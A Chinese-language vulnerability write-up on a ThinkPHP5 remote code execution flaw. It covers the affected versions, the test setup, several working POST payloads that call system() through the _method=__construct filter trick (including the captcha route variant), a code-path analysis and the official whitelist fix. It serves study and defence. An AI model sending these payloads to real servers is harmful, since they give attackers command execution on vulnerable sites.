# ThinkPHP5 远程代码执行2

Author: H3rmesk1t

Data: 2021.08.16

# 漏洞概要
- 本次漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致远程代码执行漏洞的产生
- 漏洞影响版本：
5.0.0<=ThinkPHP5<=5.0.23 、5.1.0<=ThinkPHP<=5.1.30

# 初始配置

获取测试环境代码

```bash
composer create-project --prefer-dist topthink/think=5.0.20 tpdemo
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/45d4638ea54041578af60d9dae0cea78.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

将 composer.json 文件的 require 字段设置成如下

```bash
"require": {
    "php": ">=5.4.0",
    "topthink/framework": "5.0.23"
},
```

然后执行 `composer update`

![在这里插入图片描述](https://img-blog.csdnimg.cn/24b4f007e8f3428dbf0d89eba49b9218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞利用

Payload

```bas
# ThinkPHP <= 5.0.13
POST /?s=index/index
s=whoami&_method=__construct&method=&filter[]=system

# ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al

# ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=xxx HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/25f1195fa70f41b59bf2a19b2ad6a76e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞分析

从官方的修复代码中可以很明显的看出 `$method` 来自可控的 `$_POST` 数组，而且在获取之后没有进行任何检查直接把它作为 `Request` 类的方法进行调用，同时该方法传入的参数是可控数据 `$_POST`，也就相当于可以随意调用 `Request` 类的部分方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/e3f961e9d0f94aa59b1e59fd551fb4ca.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/da28a256be2c4ab6ba1070cc5a37b5ee.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

同时可以观察到 `Request` 类的 `__construct` 方法中存在类属性覆盖的功能，这对之后的利用非常有利， `Request` 类的所有属性如下

```bash
protected $get                  protected static $instance;
protected $post                 protected $method;
protected $request              protected $domain;
protected $route                protected $url;
protected $put;                 protected $baseUrl;
protected $session              protected $baseFile;
protected $file                 protected $root;
protected $cookie               protected $pathinfo;
protected $server               protected $path;
protected $header               protected $routeInfo 
protected $mimeType             protected $env;
protected $content;             protected $dispatch 
protected $filter;              protected $module;
protected static $hook          protected $controller;
protected $bind                 protected $action;
protected $input;               protected $langset;
protected $cache;               protected $param   
protected $isCheckCache;    
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ff6d0950d8a34b2fbcdd1b7e05e3c628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

继续跟进程序发现如果框架在配置文件中开启了 `debug` 模式（ 'app_debug'=true ），程序会调用 `Request` 类的 `param` 方法，这个方法需要特别关注了，因为 `Request` 类中的 `param、route、get、post、put、delete、patch、request、session、server、env、cookie、input` 方法均调用了 `filterValue` 方法，而该方法中就存在可利用的 `call_user_func` 函数。

![在这里插入图片描述](https://img-blog.csdnimg.cn/c3bb1ed0cd044ea9a272d635f7ef29c9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/1cc13262ebd54df79e83c6d77e8489d1.png#pic_center)


跟进 `param` 方法后发现其调用 `method` 方法， `method` 方法会调用 `server` 方法，而在 `server` 方法中把 `$this->server` 传入了 `input` 方法，这个 `$this->server` 的值可以通过先前 `Request` 类的 `__construct` 方法来覆盖赋值，当可控数据作为 `$data` 传入 `input` 方法时，`$data` 会被 `filterValue` 方法使用 `$filter` 过滤器处理，其中 `$filter` 的值部分来自 `$this->filter` ，又是可以通过先前 `Request` 类的 `__construct` 方法来覆盖赋值

![在这里插入图片描述](https://img-blog.csdnimg.cn/ef7291717452471da4f24992a13f6cc1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/198a4554f0a14a6e98ff8014024d2340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

接下来就是 `filterValue` 方法调用 `call_user_func` 处理数据的过程，代码执行也就是发生在这里

![在这里插入图片描述](https://img-blog.csdnimg.cn/d2023f6f9177407fa3775032794aa934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

接下来再来看看如果没有开启框架调试模式，是否可以利用该漏洞，在 `run` 方法中会执行一个 `exec` 方法，当该方法中的 `$dispatch['type']` 等于 `controller` 或者 `method` 时，又会调用 `Request` 类的 `param` 方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/a3c8d43258d64ca2ad0e65a4b2154df7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/308730dbbf3e40a9b60f5551cffc4393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进 `Request` 类的 `param` 方法，其后面的调用过程又会和先前的分析一样了
现在还要解决一个问题，就是如何让 `$dispatch['type']` 等于 `controller` 或者 `method` ，通过跟踪代码发现   `$dispatch['type']` 来源于 `parseRule` 方法中的 `$result` 变量，而 `$result` 变量又与 `$route` 变量有关系，这个 `$route` 变量取决于程序中定义的路由地址方式

![在这里插入图片描述](https://img-blog.csdnimg.cn/5e6e831930bc453bae2191c044ffc477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c9a2ae45a77f483abd4ba54a71b07ff8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

ThinkPHP5 中支持5种路由地址方式定义

|定义方式  |定义格式  |
|--|--|
| 方式1：路由到模块/控制器 |'[模块/控制器/操作]?额外参数1=值1&额外参数2=值2...'  |
|方式2：路由到重定向地址|'外部地址'（默认301重定向） 或者 ['外部地址','重定向代码']|
|方式3：路由到控制器的方法 |'@[模块/控制器/]操作' |
|方式4：路由到类的方法 |'\完整的命名空间类::静态方法' 或者 '\完整的命名空间类@动态方法' |
|方式5：路由到闭包函数 |闭包函数定义（支持参数传入） |

在 ThinkPHP5 完整版中，定义了验证码类的路由地址，程序在初始化时会通过自动类加载机制，将 `vendor` 目录下的文件加载，这样在 `GET` 方式中便多了这一条路由，可以利用这一路由地址使得 `$dispatch['type']` 等于 `method` ，从而完成远程代码执行漏洞

构造出的Payload

```bas
POST /index.php?s=captcha HTTP/1.1
    ⋮
Content-Length: 59

_method=__construct&filter[]=system&method=get&get[]=ls+-al
# 或者
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```
# 漏洞修复

官方的修复方法是：对请求方法 `$method` 进行白名单校验

![在这里插入图片描述](https://img-blog.csdnimg.cn/8276fe2e0ac3452cbe8e38e5d51bf33a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 攻击总结

参考Mochazz师傅的审计流程

![在这里插入图片描述](https://img-blog.csdnimg.cn/3ad586d142d6425e81ca5dcda24165cb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
